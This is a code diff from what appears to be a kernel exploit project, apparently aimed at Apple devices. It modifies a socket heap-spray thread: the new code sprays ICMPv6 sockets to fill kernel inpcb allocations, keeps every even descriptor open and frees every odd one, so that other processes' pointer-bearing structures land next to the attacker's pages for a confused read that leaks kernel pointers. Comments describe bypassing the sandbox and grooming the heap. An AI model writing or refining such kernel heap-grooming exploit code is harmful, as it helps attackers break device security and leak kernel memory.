@@ -83,25 +83,46 @@ static void *rc_socket_spray_thread(void *arg) {
     while (rc_sprayGo) {
         int fds[SOCK_SPRAY_BURST];
         int count = 0;
-        
+        static int g_interleaveTotal = 0;
+        int held = 0;
+
         // Spray sockets (allocates inpcb in kernel)
-        // FIX: Use SOCK_DGRAM instead of SOCK_RAW to bypass sandbox restrictions
         for (int i = 0; i < SOCK_SPRAY_BURST; i++) {
             fds[i] = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
             if (fds[i] >= 0) {
                 count++;
             }
         }
-        
-        // Close them all (frees inpcb, physical pages return to pool)
+
+        // THE INTERLEAVED GROOM (2026-11-07, the AIM/oob decode): hold
+        // every EVEN fd (persistent occupancy — our pages stay put),
+        // close every ODD fd (freed slots refilled by SYSTEM churn =
+        // OTHER processes' pointer-bearing structures). The confused
+        // read then has foreign pages in play — the AIM classifier's
+        // KPTR row is the unlock test.
         for (int i = 0; i < SOCK_SPRAY_BURST; i++) {
-            if (fds[i] >= 0) {
-                close(fds[i]);
+            if (fds[i] < 0) continue;
+            if (i & 1) {
+                close(fds[i]);                    /* odd = freed for churn */
+                rc_sprayFrees++;
+            } else {
+                g_interleaveTotal++;              /* even = HELD */
+                held++;
             }
         }
-        
+        if (g_interleaveTotal > 4096) {           /* the release law: un-hold */
+            for (int i = 0; i < rc_holdN; i++) close(rc_hold[i]);
+            rc_holdN = 0; g_interleaveTotal = 0;
+        }
+        if (rc_holdN + held < (int)(sizeof(rc_hold)/sizeof(rc_hold[0]))) {
+            int nh = 0;
+            for (int i = 0; i < SOCK_SPRAY_BURST; i++)
+                if (fds[i] >= 0 && !(i & 1)) rc_hold[rc_holdN++] = fds[i], nh++;
+            (void)nh;
+        } else {
+            for (int i = 0; i < SOCK_SPRAY_BURST; i++) if (fds[i] >= 0 && !(i & 1)) close(fds[i]);
+        }
         rc_sprayAllocs += count;
-        rc_sprayFrees += count;
         usleep(SOCK_SPRAY_DELAY);
     }
     return NULL;
@@ -110,6 +131,9 @@ static void *rc_socket_spray_thread(void *arg) {
 @implementation LightSwordCalib
 
 static int g_rc_log_fd = -1;
+#define RC_HOLD_MAX 4096
+static int rc_hold[RC_HOLD_MAX];
+static int rc_holdN = 0;
 static NSMutableString *g_rc_log_str = nil;
 
 static void rc_log(const char *fmt, ...) {
